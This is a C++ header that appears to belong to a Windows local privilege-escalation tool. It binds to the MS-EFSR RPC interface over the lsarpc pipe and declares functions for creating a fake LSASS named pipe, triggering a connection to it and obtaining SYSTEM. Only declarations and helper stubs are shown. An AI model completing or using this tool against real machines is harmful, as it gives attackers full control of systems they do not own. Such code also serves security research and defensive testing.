#pragma once
#include <iostream>
#include <Windows.h>
#include <strsafe.h>
#include <sddl.h>
#include <userenv.h>
#include <stdio.h>
#include <tchar.h>
#include <assert.h>
#include <SDKDDKVer.h>
#include "ms-efsrpc_h.h"

#pragma comment(lib, "userenv.lib")
#pragma warning( disable : 28251 )

const RPC_WSTR MS_EFSR_UUID = (RPC_WSTR)L"c681d488-d850-11d0-8c52-00c04fd90f7e";
const RPC_WSTR InterfaceAddress = (RPC_WSTR)L"\\pipe\\lsarpc";


void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
	free(p);
}

handle_t Bind(wchar_t* target);
DWORD WINAPI TriggerNamedPipeConnectionThread(LPVOID lpParam);

BOOL CheckAndEnablePrivilege(HANDLE hTokenToCheck, LPCWSTR pwszPrivilegeToCheck);
BOOL GenerateRandomPipeName(LPWSTR* ppwszPipeName);
HANDLE CreateLsassNamedPipe(LPWSTR pwszPipeName);
HANDLE ConnectLsassNamedPipe(HANDLE hPipe);
HANDLE TriggerNamedPipeConnection(LPWSTR pwszPipeName);
BOOL GetSystem(HANDLE hPipe);